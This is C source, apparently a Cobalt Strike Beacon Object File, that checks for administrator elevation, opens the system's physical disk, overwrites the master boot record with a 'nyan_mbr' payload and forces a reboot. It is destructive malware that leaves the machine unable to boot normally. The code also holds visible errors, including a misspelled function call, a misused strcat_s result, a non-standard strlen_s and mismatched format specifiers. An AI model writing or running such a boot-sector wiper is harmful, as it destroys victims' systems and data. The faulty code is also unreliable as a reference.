BOOL isHighIntegrity()
{
    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD size;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return elevation.TokenIsElevated;
}

void go(char *args, int alen)
{
    if (!isHighIntegity())
    {
        BeaconPrintf(CALLBACK_ERROR, "This function requires High-IL privileges.\n");
        return;
    }

    // Determine system disk
    char sysDir[MAX_PATH];
    if (!GetSystemDirectoryA(sysDir, MAX_PATH))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get system directory - %d\n", GetLastError());
        return;
    }

    char volPath[4] = {sysDir[0], ':', '\\', '\0'};
    char devPath = strcat_s("\\\\.\\", 4, volPath);

    if (strlen_s(volPath, 4) < 3 || volPath[1] != ':')
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid volume path: %s\n", volPath);
        return;
    }
    HANDLE hVol = CreateFileA(volPath, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVol == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open volume %s - %d\n", volPath, GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Successfully opened volume %d\n", volPath);

    // Get disk extents
    // This will retrieve the disk number associated with the volume
    VOLUME_DISK_EXTENTS extents;
    DWORD bytesReturned;

    if (!DeviceIoControl(hVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, &extents, sizeof(extents), &bytesReturned, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get disk extents - %d\n", GetLastError());
        CloseHandle(hVol);
        return;
    }

    char physPath[MAX_PATH];
    if (snprintf_s(physPath, sizeof(physPath), "\\\\.\\PhysicalDrive%d", extents.Extents[0].DiskNumber) < 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to format physical path\n");
        CloseHandle(hVol);
        return;
    }
    HANDLE hDisk = CreateFileA(physPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDisk == INVALID_HANDLE_VALUE)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open disk %s - %d\n", devPath, GetLastError());
        CloseHandle(hVol);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Overwriting MBR on disk %s\n", physPath);
    WriteFile(hDisk, nyan_mbr, nyan_mbr_len, NULL, NULL);
    CloseHandle(hDisk);

    BeaconPrintf(CALLBACK_OUTPUT, "Rebooting the system to execute the new MBR...\n");
    CloseHandle(hVol);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE);
}